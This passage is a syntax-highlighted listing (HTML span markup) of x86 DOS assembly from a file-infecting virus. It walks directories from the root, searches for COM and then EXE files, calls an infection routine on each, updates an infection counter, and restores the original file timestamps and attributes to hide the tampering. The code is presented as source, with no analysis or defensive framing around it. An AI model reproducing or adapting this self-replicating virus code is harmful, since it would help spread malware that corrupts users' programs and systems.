    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_HAND</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Move file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5700H</span><span class="sc0">        </span><span class="sc1">; Get file date and time function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_TIME</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Save file time</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_DATE</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Save file date</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc5">DB0004</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Decrement infection count</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">FLENLO</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get file length, low word</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">FLENHI</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get file length, high word</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DB0004</span><span class="sc0">    </span><span class="sc1">; \ Add to length</span><span class="sc0">
    </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer (start) function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
</span><span class="sc5">BP0090</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; Test switch three</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0100</span><span class="sc0">          </span><span class="sc1">; Branch if off</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0330</span><span class="sc0">          </span><span class="sc1">; Write infection count</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0270</span><span class="sc0">

    </span><span class="sc1">; Change directory to root</span><span class="sc0">

</span><span class="sc5">BP0100</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">           </span><span class="sc1">; Default drive</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">47H</span><span class="sc0">          </span><span class="sc1">; Get current directory function</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">46H</span><span class="sc0">          </span><span class="sc1">; Address directory store</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">CRTERR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Test critical error flag</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0110</span><span class="sc0">          </span><span class="sc1">; Branch if set</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0250</span><span class="sc0">          </span><span class="sc1">; Make root dir current dir</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0120</span><span class="sc0">          </span><span class="sc1">; Branch if no error</span><span class="sc0">
</span><span class="sc5">BP0110</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0070</span><span class="sc0">

    </span><span class="sc1">; Find COM files</span><span class="sc0">

</span><span class="sc5">BP0120</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address DTA area</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DTAFLE</span><span class="sc0">    </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc0">          </span><span class="sc1">; Set DTA function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'.*'</span><span class="sc0">     </span><span class="sc1">; \
    MOV [SI+7],'OC'     ;  ) '*.COM'</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0"> </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4EH</span><span class="sc0">          </span><span class="sc1">; Find first file function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address file spec</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
</span><span class="sc5">BP0130</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0020H</span><span class="sc0">        </span><span class="sc1">; Attributes - archive</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Perform a DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Move on to EXE files</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address filename in DTA</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DTAFLE</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc0">    </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">ISWTCH</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Set infected file switch off</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0350</span><span class="sc0">          </span><span class="sc1">; Process file</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0150</span><span class="sc0">          </span><span class="sc1">; Error or infected file found</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0330</span><span class="sc0">          </span><span class="sc1">; Write infection count</span><span class="sc0">
</span><span class="sc5">BP0140</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0260</span><span class="sc0">

</span><span class="sc5">BP0150</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">CRTERR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Test critical error flag</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0140</span><span class="sc0">          </span><span class="sc1">; Branch if set</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">ISWTCH</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Test infected file switch</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0200</span><span class="sc0">          </span><span class="sc1">; Branch if on</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc0">          </span><span class="sc1">; Find next file function</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0130</span><span class="sc0">

    </span><span class="sc1">; Find EXE files</span><span class="sc0">

</span><span class="sc5">BP0160</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">     </span><span class="sc1">; \ '*.EXE'</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0"> </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4EH</span><span class="sc0">          </span><span class="sc1">; Find first file function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address file spec</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
</span><span class="sc5">BP0170</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0020H</span><span class="sc0">        </span><span class="sc1">; Attributes - archive</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Perform a DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0200</span><span class="sc0">          </span><span class="sc1">; No more files</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address filename in DTA</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DTAFLE</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc0">    </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">ISWTCH</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Set infected file switch off</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0350</span><span class="sc0">          </span><span class="sc1">; Process file</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0190</span><span class="sc0">          </span><span class="sc1">; Error or infected file found</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0330</span><span class="sc0">          </span><span class="sc1">; Write infection count</span><span class="sc0">
</span><span class="sc5">BP0180</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0260</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc5">BP0190</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">CRTERR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Test critical error flag</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0180</span><span class="sc0">          </span><span class="sc1">; Branch if set</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">ISWTCH</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Test infected file switch</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0200</span><span class="sc0">          </span><span class="sc1">; Branch if on</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc0">          </span><span class="sc1">; Find next file function</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0170</span><span class="sc0">

</span><span class="sc5">BP0200</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0250</span><span class="sc0">          </span><span class="sc1">; Make root dir current dir</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address 2nd DTA</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DTADIR</span><span class="sc0">    </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc0">          </span><span class="sc1">; Set DTA function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
</span><span class="sc5">BP0210</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc0">          </span><span class="sc1">; Find next file function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0010H</span><span class="sc0">        </span><span class="sc1">; Find directories</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">DB00DF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; First time?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0220</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DB00DF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Set not-first-time switch</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'.*'</span><span class="sc0">     </span><span class="sc1">; \ '*.*'</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc12">'*'</span><span class="sc0"> </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4EH</span><span class="sc0">          </span><span class="sc1">; Find first file function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address file spec</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
</span><span class="sc5">BP0220</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Perform a DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0260</span><span class="sc0">          </span><span class="sc1">; No more files</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc5">DTADIR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">15H</span><span class="sc4">],</span><span class="sc2">10H</span><span class="sc0">  </span><span class="sc1">; Is it a directory?</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0210</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address file name in DTA</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DTADIR</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc0">    </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3BH</span><span class="sc0">          </span><span class="sc1">; Change current directory function</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Perform a DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0260</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0120</span><span class="sc0">          </span><span class="sc1">; Look for COM files</span><span class="sc0">

    </span><span class="sc1">; Perform a DOS service</span><span class="sc0">

</span><span class="sc5">BP0230</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0240</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc5">CRTERR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0FFH</span><span class="sc0">     </span><span class="sc1">; Test critical error flag</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0240</span><span class="sc0">          </span><span class="sc1">; Branch if not set</span><span class="sc0">
    </span><span class="sc6">STC</span><span class="sc0">
</span><span class="sc5">BP0240</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Make root dir current dir</span><span class="sc0">

</span><span class="sc5">BP0250</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc13">'\' ; Root dir
</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address root dir pathname</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3BH</span><span class="sc0">          </span><span class="sc1">; Change current directory function</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Perform a DOS service</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
</span><span class="sc5">BP0260</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0250</span><span class="sc0">          </span><span class="sc1">; Make root dir current dir</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">46H</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3BH</span><span class="sc0">          </span><span class="sc1">; Change current directory function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
</span><span class="sc5">BP0270</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">F_HAND</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Test for a handle</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0290</span><span class="sc0">          </span><span class="sc1">; Branch if none</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">F_ATTR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get file attributes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">PTH_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get pathname offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc5">PTH_SG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get pathname segment</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">          </span><span class="sc1">; Are attributes archive?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0280</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">        </span><span class="sc1">; Set attributes function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
</span><span class="sc5">BP0280</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">F_TIME</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get file time</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">F_DATE</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get file date</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5701H</span><span class="sc0">        </span><span class="sc1">; Set file date and time function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">          </span><span class="sc1">; Close handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
</span><span class="sc5">BP0290</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc5">CURDSK</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get current disk</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc0">          </span><span class="sc1">; Select disk function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0610</span><span class="sc0">          </span><span class="sc1">; Restore Int 24H vector</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; ? </span><span class="sc0">
